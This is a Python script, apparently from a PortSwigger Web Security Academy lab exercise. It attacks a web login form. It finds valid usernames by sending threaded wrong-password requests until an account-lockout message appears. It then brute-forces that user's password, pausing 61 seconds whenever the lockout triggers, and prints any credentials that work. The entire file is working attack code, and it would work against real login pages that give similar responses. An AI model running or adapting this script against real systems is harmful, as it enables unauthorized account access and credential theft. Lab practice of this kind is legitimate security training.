import requests
import argparse
import threading
import time

parser = argparse.ArgumentParser()
parser.add_argument("-u", help="URL", dest="URL")

args = parser.parse_args()
url = args.URL


passwords = open("/home/kali/PortSwigger/wordlists/test_pass")
usernames = open("/home/kali/PortSwigger/wordlists/test_user")

"""

loops over the users to find where account locks, if account locks it calls the pass_loop to find the users password

"""

def user_loop():
	for user in usernames:
		user = user.strip()
		r = user_enum(user)	
		print(f"{user}: {len(r.content)}")
		if "You have made too many incorrect login attempts." in r.text:
			pass_loop(user)	

"""

using multithreading this function enumerates which usernames are registered

"""

def user_enum(target_user):
	t1 = threading.Thread(target=post_to_target, args=(target_user, "password"))
	t2 = threading.Thread(target=post_to_target, args=(target_user, "password"))
	t3 = threading.Thread(target=post_to_target, args=(target_user, "password"))
	t1.start()
	t2.start()
	t3.start()
	t1.join()
	t2.join()
	t3.join()
	return post_to_target(target_user, "password")




"""

posts the request to the target

"""

def post_to_target(username, password):
	payload['username'] = username
	payload['password'] = password
	r = requests.post(url, data=payload)
	return r
"""

Password loop goes over each password and if the error message shows up it waits 60 seconds until it goes away to continue brute forcing the password

"""

def pass_loop(target_user):
	print(target_user)
	for password in passwords:
		password = password.strip()
		r = post_to_target(target_user, password)
		if "You have made too many incorrect login attempts." in r.text:
			time.sleep(61)
			r = post_to_target(target_user, password)
			if "You have made too many incorrect login attempts." in r.text:
				time.sleep(61)
		if "Invalid username or password." not in r.text:
			print(r.text)
			print(f"Username: {target_user}	Password: {password}")


payload = {'username': "", 'password': ""}
user_loop()